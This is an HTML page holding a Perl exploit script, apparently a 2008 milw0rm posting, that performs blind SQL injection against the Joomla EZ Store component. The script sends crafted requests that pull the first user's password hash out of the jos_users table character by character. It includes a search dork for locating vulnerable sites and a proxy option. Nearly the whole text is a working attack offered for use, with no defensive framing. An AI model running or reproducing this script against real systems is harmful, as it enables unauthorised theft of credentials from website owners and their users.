<html><head><title>Joomla Component EZ Store Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Note:Sometimes you have to change the regexp to  viewcategory/catid,&quot;.$cid.&quot;
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
  print &quot;                                                                  \n&quot;;
    print &quot;   ################################################################\n&quot;;
  print &quot;   #   Joomla Component EZ Store Blind SQL Injection Exploit      #\n&quot;;
  print &quot;   #   Author:His0k4 [ALGERIAN HaCkeR]                            #\n&quot;;
  print &quot;   #                                                              #\n&quot;;
  print &quot;   #   Conctact: His0k4.hlm[at]gamil.com                          #\n&quot;;
  print &quot;   #   Greetz:   All friends &amp; muslims HacKeRs                    #\n&quot;;
  print &quot;   #   Greetz2:  http://www.dz-secure.com                         #\n&quot;;
  print &quot;   #                                                              #\n&quot;;
  print &quot;   #   Dork:    inurl:com_ezstore                                 #\n&quot;;
  print &quot;   #   Usage:   perl ezstore.pl host path &lt;options&gt;               #\n&quot;;
  print &quot;   #   Example: perl ezstore.pl www.host.com /joomla/ -p 11 -c 2  #\n&quot;;
  print &quot;   #                                                              #\n&quot;;
  print &quot;   #   Options:                                                   #\n&quot;;
  print &quot;   #     -t    Valid  procuct id                                  #\n&quot;;
  print &quot;   #     -c    Category value of the following  product id        #\n&quot;;
  print &quot;   ################################################################\n&quot;;

  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $cid     = $ARGV[2];
my $pid     = $ARGV[3];

my %options = ();
GetOptions(\%options, &quot;c=i&quot;, &quot;x=s&quot;, &quot;p=i&quot;);

print &quot;[~] Exploiting...\n&quot;;

if($options{&quot;c&quot;})
{
  $cid = $options{&quot;c&quot;};
}

if($options{&quot;p&quot;})
{
  $pid = $options{&quot;p&quot;};
}

syswrite(STDOUT, &quot;[~] MD5-Hash: &quot;, 14);

for(my $i = 1; $i &lt;= 32; $i++)
{
  my $f = 0;
  my $h = 48;
  while(!$f &amp;&amp; $h &lt;= 57)
  {
    if(istrue2($host, $path, $cid, $pid, $i, $h))
    {
      $f = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$f)
  {
    $h = 97;
    while(!$f &amp;&amp; $h &lt;= 122)
    {
      if(istrue2($host, $path, $cid, $pid, $i, $h))
      {
        $f = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}

print &quot;\n[~] Exploiting done\n&quot;;

sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $cid   = shift;
  my $pid   = shift;
  my $i     = shift;
  my $h     = shift;
 
  my $ua = LWP::UserAgent-&gt;new;
  my $query = &quot;http://&quot;.$host.$path.&quot;index.php?option=com_ezstore&amp;Itemid=1&amp;func=detail&amp;id=&quot;.$pid.&quot; and (SUBSTRING((SELECT password FROM jos_users LIMIT 0,1),&quot;.$i.&quot;,1))=CHAR(&quot;.$h.&quot;)&quot;;
 
  if($options{&quot;x&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;x&quot;});
  }
 
  my $resp = $ua-&gt;get($query);
  my $content = $resp-&gt;content;
  my $regexp = &quot;viewcategory&amp;catid=&quot;.$cid.&quot;&quot;;
 
  if($content =~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }

}

# milw0rm.com [2008-08-03]</pre></html>